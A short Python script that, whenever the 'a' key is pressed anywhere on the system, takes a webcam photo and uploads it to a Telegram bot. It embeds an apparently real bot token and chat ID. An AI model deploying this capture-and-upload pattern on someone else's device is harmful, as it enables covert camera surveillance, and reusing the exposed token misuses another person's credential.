import cv2
import requests
import numpy as np
import time
import keyboard

# Telegram Bot settings
TOKEN = '6638522798:AAEO52tXc96heSCt0Yjh1_Oxl9hNv_ZrNB8'
CHAT_ID = '692879409'  # You can get this from the Telegram API

# Function to capture image using laptop camera
def capture_image():
    camera = cv2.VideoCapture(0)  # Open the default camera (usually laptop's camera)
    if not camera.isOpened():
        print("Error: Failed to open camera")
        return None
    return_value, image = camera.read()  # Capture the image
    camera.release()  # Release the camera
    return image

# Function to send image to Telegram
def send_photo(image):
    if image is None:
        print("Error: Image capture failed")
        return
    # Convert image to RGB format (OpenCV captures in BGR by default)
    image_rgb = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)
    # Encode image to JPEG format
    _, encoded_image = cv2.imencode('.jpg', image_rgb)
    # Convert encoded image data to bytes
    photo_data = encoded_image.tobytes()
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    files = {'photo': ('image.jpg', photo_data, 'multipart/form-data')}
    data = {'chat_id': CHAT_ID}
    response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print("Photo sent successfully!")
    else:
        print("Failed to send photo. Error:", response.text)

# Main function
def main():
    while True:
        if keyboard.is_pressed('a'):
            image = capture_image()
            send_photo(image)
            time.sleep(1)  # Wait for 1 second before checking for key press again

if __name__ == "__main__":
    main()